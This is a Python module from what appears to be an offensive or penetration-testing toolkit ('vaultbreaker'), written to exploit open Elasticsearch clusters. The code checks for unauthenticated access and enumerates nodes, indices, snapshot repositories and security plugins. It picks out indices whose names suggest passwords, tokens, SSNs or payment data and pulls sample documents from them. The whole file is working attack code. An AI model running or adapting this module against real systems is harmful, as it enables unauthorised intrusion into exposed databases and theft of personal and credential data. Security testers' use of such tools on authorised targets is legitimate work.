"""Elasticsearch exploitation -- unauthenticated access, index enumeration, data sampling."""
from __future__ import annotations

import re
from typing import Optional

from vaultbreaker.models import AttackResult, Credential, EngagementContext
from vaultbreaker.logger import info, ok, warn, crit, section, console
from vaultbreaker.modules.base import BaseModule
from vaultbreaker.data import http_request


class ElasticModule(BaseModule):
    """Elasticsearch exploitation -- unauthenticated access, index enumeration, data sampling."""

    name = "elastic"

    SENSITIVE_INDEX_KEYWORDS = [
        "user", "customer", "payment", "credential", "password", "session",
        "token", "log", "audit", "secret", "admin", "account", "auth",
        "credit", "ssn", "email", "private", "key", "cert", "config",
    ]

    def run(self, ctx: EngagementContext) -> None:
        section("Elasticsearch Module")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            port = 9200
            for p in ctx.ports:
                if p in (9200, 9201, 9300):
                    port = p
                    break
            base = f"http://{host}:{port}"
            info(f"Target: {base}")
            if self._unauth_check(ctx, base):
                self._cluster_info(ctx, base)
                self._index_enumeration(ctx, base)
                self._kibana_detection(ctx, host)
                self._snapshot_repos(ctx, base)
                self._security_plugins(ctx, base)

    def _unauth_check(self, ctx: EngagementContext, base: str) -> bool:
        resp = http_request(f"{base}/", timeout=ctx.timeout)
        if resp is None:
            ctx.add_result(AttackResult("elastic", "Connection", "fail", "info",
                                        f"Cannot connect to {base}"))
            return False
        if resp.status_code == 401:
            ctx.add_result(AttackResult("elastic", "Unauthenticated Access", "ok", "info",
                                        "Authentication required (HTTP 401)"))
            return False
        try:
            data = resp.json()
            cluster_name = data.get("cluster_name", "unknown")
            version = data.get("version", {}).get("number", "unknown")
            tagline = data.get("tagline", "")
            ctx.add_result(AttackResult(
                "elastic", "Unauthenticated Access", "critical", "critical",
                f"Elasticsearch {version} open — cluster: {cluster_name}, tagline: {tagline}"
            ))
            return True
        except (ValueError, KeyError):
            if resp.status_code == 200:
                ctx.add_result(AttackResult("elastic", "Unauthenticated Access", "ok", "medium",
                                            "Port open but non-standard response"))
                return True
        return False

    def _cluster_info(self, ctx: EngagementContext, base: str):
        resp = http_request(f"{base}/_cluster/health", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                health = resp.json()
                ctx.add_result(AttackResult(
                    "elastic", "Cluster Health", "ok", "medium",
                    f"status={health.get('status')}, nodes={health.get('number_of_nodes')}, "
                    f"indices={health.get('active_primary_shards')}, "
                    f"unassigned={health.get('unassigned_shards')}"
                ))
            except ValueError:
                pass
        resp = http_request(f"{base}/_nodes", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                nodes = resp.json()
                node_list = nodes.get("nodes", {})
                for nid, ninfo in list(node_list.items())[:5]:
                    ctx.add_result(AttackResult(
                        "elastic", "Node Info", "ok", "high",
                        f"node={ninfo.get('name', '?')}, ip={ninfo.get('ip', '?')}, "
                        f"version={ninfo.get('version', '?')}, "
                        f"os={ninfo.get('os', {}).get('pretty_name', '?')}, "
                        f"jvm={ninfo.get('jvm', {}).get('version', '?')}"
                    ))
            except ValueError:
                pass

    def _index_enumeration(self, ctx: EngagementContext, base: str):
        resp = http_request(f"{base}/_cat/indices?v&format=json", timeout=ctx.timeout)
        if not resp or resp.status_code != 200:
            return
        try:
            indices = resp.json()
        except ValueError:
            return
        ctx.add_result(AttackResult(
            "elastic", "Index Enumeration", "ok", "high",
            f"Found {len(indices)} indices"
        ))
        sensitive_indices = []
        for idx in indices:
            idx_name = idx.get("index", "")
            doc_count = idx.get("docs.count", "0")
            store_size = idx.get("store.size", "?")
            is_sensitive = any(kw in idx_name.lower() for kw in self.SENSITIVE_INDEX_KEYWORDS)
            if is_sensitive:
                sensitive_indices.append(idx_name)
                ctx.add_result(AttackResult(
                    "elastic", "Sensitive Index Detected", "critical", "high",
                    f"Index '{idx_name}' — {doc_count} docs, size: {store_size}"
                ))
        for idx_name in sensitive_indices[:5]:
            search_resp = http_request(f"{base}/{idx_name}/_search?size=5", timeout=ctx.timeout)
            if search_resp and search_resp.status_code == 200:
                try:
                    hits = search_resp.json().get("hits", {}).get("hits", [])
                    if hits:
                        fields = list(hits[0].get("_source", {}).keys())
                        ctx.add_result(AttackResult(
                            "elastic", "Document Sampling", "ok", "critical",
                            f"{idx_name}: {len(hits)} docs sampled, fields: {', '.join(fields[:15])}"
                        ))
                except ValueError:
                    pass

    def _kibana_detection(self, ctx: EngagementContext, host: str):
        resp = http_request(f"http://{host}:5601/api/status", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                version = data.get("version", {}).get("number", "unknown")
                ctx.add_result(AttackResult(
                    "elastic", "Kibana Detection", "critical", "high",
                    f"Kibana {version} detected at {host}:5601"
                ))
            except ValueError:
                ctx.add_result(AttackResult(
                    "elastic", "Kibana Detection", "ok", "medium",
                    f"Kibana responding at {host}:5601 (non-JSON response)"
                ))
        else:
            ctx.add_result(AttackResult("elastic", "Kibana Detection", "fail", "info",
                                        "Kibana not detected on port 5601"))

    def _snapshot_repos(self, ctx: EngagementContext, base: str):
        resp = http_request(f"{base}/_snapshot", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                repos = resp.json()
                if repos:
                    repo_names = list(repos.keys())
                    ctx.add_result(AttackResult(
                        "elastic", "Snapshot Repositories", "ok", "high",
                        f"Found {len(repo_names)} snapshot repos: {', '.join(repo_names[:10])}"
                    ))
                    for repo_name in repo_names[:3]:
                        repo_type = repos[repo_name].get("type", "?")
                        repo_settings = repos[repo_name].get("settings", {})
                        ctx.add_result(AttackResult(
                            "elastic", "Snapshot Repo Details", "ok", "medium",
                            f"{repo_name}: type={repo_type}, location={repo_settings.get('location', '?')}"
                        ))
            except ValueError:
                pass

    def _security_plugins(self, ctx: EngagementContext, base: str):
        resp = http_request(f"{base}/_xpack", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                xpack = resp.json()
                security = xpack.get("features", {}).get("security", {})
                ctx.add_result(AttackResult(
                    "elastic", "Security Plugin — X-Pack", "ok", "medium",
                    f"X-Pack security: enabled={security.get('enabled', '?')}, "
                    f"available={security.get('available', '?')}"
                ))
            except ValueError:
                pass
        resp = http_request(f"{base}/_plugins/_security/api/account", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            ctx.add_result(AttackResult(
                "elastic", "Security Plugin — OpenSearch", "ok", "medium",
                "OpenSearch Security plugin detected"
            ))
        resp = http_request(f"{base}/_searchguard/authinfo", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            ctx.add_result(AttackResult(
                "elastic", "Security Plugin — SearchGuard", "ok", "medium",
                "SearchGuard plugin detected"
            ))
